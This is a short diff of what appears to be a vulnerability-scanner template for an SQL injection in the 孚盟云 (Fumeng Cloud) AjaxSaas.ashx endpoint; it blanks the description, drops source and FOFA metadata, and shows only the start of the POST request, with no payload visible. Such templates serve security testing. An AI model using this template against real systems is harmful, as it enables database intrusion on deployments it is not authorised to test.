@@ -3,12 +3,8 @@ info:
   name: 孚盟云 AjaxSaas.ashx 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/woo2s7gat33k3gyh'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: woo2s7gat33k3gyh
-    fofa: app="孚盟软件-孚盟云"
 http:
 - raw:
   - 'POST /Ajax/AjaxSaas.ashx HTTP/1.1
